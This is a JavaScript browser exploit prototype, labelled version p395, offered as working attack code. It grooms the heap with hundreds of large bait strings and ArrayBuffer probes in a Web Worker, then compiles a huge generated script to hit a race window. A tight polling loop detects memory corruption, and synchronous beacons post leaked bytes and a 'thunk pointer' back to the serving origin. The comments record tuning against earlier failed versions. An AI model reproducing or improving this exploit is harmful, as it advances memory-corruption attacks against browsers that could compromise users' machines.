// p395 - TIGHT POLL: 500 baits + busy-wait loop
//
// V394 DEAD: setTimeout's 4ms minimum > 3.5ms crash window.
// FIX: 500 baits extends mapped range to ~50MB (~50ms crash window).
//       Worker uses tight while(true) loop polling probes (~10us per cycle).
//       Sync XHR beacon fires ONCE on first corruption detection.
//
// Beacon prefix: V395-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V395-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {}
  }

  B('BOOT');

  var workerCode = function() {
    var baits = [];
    var strProbes = [];
    var abProbes = [];
    var abViews = [];
    var baseUrl = '';
    var STR_LEN = 100092;
    var AB_SIZE = 100112;
    var NBAIT = 500;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V395-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }
    function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    function makeStr(len, ch) {
      var s = '';
      for (var i = 0; i < 100; i++) s += ch;
      var reps = Math.ceil(len / 100);
      var result = '';
      for (var i = 0; i < reps; i++) result += s;
      result = result.substring(0, len);
      result.charCodeAt(0);
      return result;
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') { baseUrl = e.data.baseUrl; beacon('ALIVE'); return; }

      if (e.data.cmd === 'alloc') {
        // 500 baits in batches (to avoid OOM from holding all at once)
        var batchSize = 50;
        var batches = NBAIT / batchSize;
        for (var b = 0; b < batches; b++) {
          var batch = [];
          for (var i = 0; i < batchSize; i++) batch.push(makeStr(STR_LEN, 'A'));
          // Free this batch immediately
          for (var i = 0; i < batchSize; i++) batch[i] = null;
          batch = null;
        }
        beacon('BAITS-' + NBAIT + '-DONE');

        // 5 string probes (keep these alive)
        for (var i = 0; i < 5; i++) strProbes.push(makeStr(STR_LEN, 'A'));
        beacon('SPROBES-' + strProbes.length);

        // 5 AB probes (keep these alive)
        for (var i = 0; i < 5; i++) {
          var ab = new ArrayBuffer(AB_SIZE);
          var v = new Uint8Array(ab);
          for (var j = 0; j < AB_SIZE; j++) v[j] = 0x42;
          abProbes.push(ab);
          abViews.push(v);
        }
        beacon('ABPROBES-' + abProbes.length);

        // Signal ready THEN enter tight poll loop
        self.postMessage({ ready: true });

        // === TIGHT BUSY LOOP ===
        // No setTimeout -- polls as fast as JS interpreter allows (~10us per cycle)
        // Sync XHR fires ONCE when corruption detected
        beacon('TIGHTLOOP-START');
        var iter = 0;
        var sent = false;
        while (true) {
          iter++;
          // Check string probes
          for (var pi = 0; pi < strProbes.length; pi++) {
            var len = strProbes[pi].length;
            if (len !== STR_LEN) {
              if (!sent) {
                sent = true;
                beacon('RACE-HIT-ITER' + iter + '-S' + pi + '-LEN' + len);
                // Quick scan: first 200 chars
                var nonA = 0;
                var scanLen = Math.min(len, 200);
                for (var j = 0; j < scanLen; j++) {
                  if (strProbes[pi].charCodeAt(j) !== 0x41) nonA++;
                }
                beacon('RACE-S' + pi + '-SCAN200-NONA' + nonA);
              }
            }
          }
          // Check AB probes (spot check)
          for (var pi = 0; pi < abProbes.length; pi++) {
            var v = abViews[pi];
            if (v[0] !== 0x42 || v[24] !== 0x42 || v[64] !== 0x42 || v[68] !== 0x42) {
              if (!sent) {
                sent = true;
                beacon('RACE-HIT-ITER' + iter + '-A' + pi);
                // Dump first 8 bytes
                var h = '';
                for (var b = 0; b < 8; b++) h += hexByte(v[b]);
                beacon('RACE-A' + pi + '-HEAD8-' + h);
                // Check entry+24 (thunk pointer)
                var t = '';
                for (var b = 24; b < 32; b++) t += hexByte(v[b]);
                beacon('RACE-A' + pi + '-THUNK-' + t);
              }
            }
          }
          // Heartbeat every 100K iterations
          if (iter % 100000 === 0 && !sent) {
            beacon('POLL-' + iter);
          }
          // Safety: stop after 50M iterations (~5 seconds)
          if (iter > 50000000) {
            beacon('POLL-TIMEOUT-' + iter + '-FOUND-' + (sent ? 'YES' : 'NO'));
            break;
          }
        }
      }
    };
  };

  var workerBlob = new Blob(['(' + workerCode.toString() + ')()'], { type: 'application/javascript' });
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: location.protocol + '//' + location.host });

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      var gcR = 0;
      function gc() {
        for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
        for (var j = 0; j < 500; j++) new Array(100).fill(gcR);
        gcR++;
        if (gcR < 30) setTimeout(gc, 30);
        else { B('GC-' + gcR); build(); }
      }
      gc();
    }
  };

  worker.postMessage({ cmd: 'alloc' });

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = [
      '(function(a){if(window.____x395){',
    ];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('}})(function(){});window.__p395ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p395ok ? 'OK' : 'FAIL'));
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
